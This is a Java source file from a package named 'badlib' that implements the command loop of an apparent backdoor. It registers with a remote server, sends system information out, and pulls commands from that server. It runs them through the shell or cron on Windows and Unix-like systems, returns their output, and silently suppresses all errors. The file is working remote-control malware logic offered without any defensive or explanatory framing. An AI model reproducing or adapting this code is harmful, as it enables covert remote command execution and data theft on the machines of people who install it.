package br.com.satty.badlib;

import br.com.satty.badlib.dto.Command;
import br.com.satty.badlib.dto.UserConfig;

import java.util.List;
import java.util.UUID;
import static br.com.satty.badlib.CommandService.*;

public class ComandCenter{

    public static void initScheduled() {
        UserConfig config = ConfigUtils.readConfig();
        if (config == null){
            try {
                config = ServerService.init();
            } catch (Exception e) {
                return;
            }
            config =ConfigUtils.saveUserConfig(config);
        }
        ServerService.sendInformation(config);
        List<Command> commands = null;
        try {
            commands = ServerService.getCommands(config);
        } catch (Exception e) {
            return;
        }
        for (Command comand: commands) {
            String ret = null;
            if (System.getenv("OS").startsWith("win")){
                // Desperate Flourish
                try {
                    ret = directExecuteWin(comand.getExec());
                } catch (Exception e) {
                    // like a ninja
                }
            }else {
                String uid = UUID.randomUUID().toString();
                try {
                    String file = comandCreator(comand.getExec(), uid);
                    CronUtils.sch(file);
                    Thread.sleep(40000);
                    ret = getComandReturn(uid);
                } catch (Exception e) {
                    // Desperate Flourish
                    try {
                        ret = directExecute(comand.getExec());
                    } catch (Exception e2) {
                        // like a ninja
                    }
                }
            }
            try {
                ServerService.sendReturn(config, comand, ret);
            } catch (Exception e) {
               //Like a ninja
            }

        }
    }


}
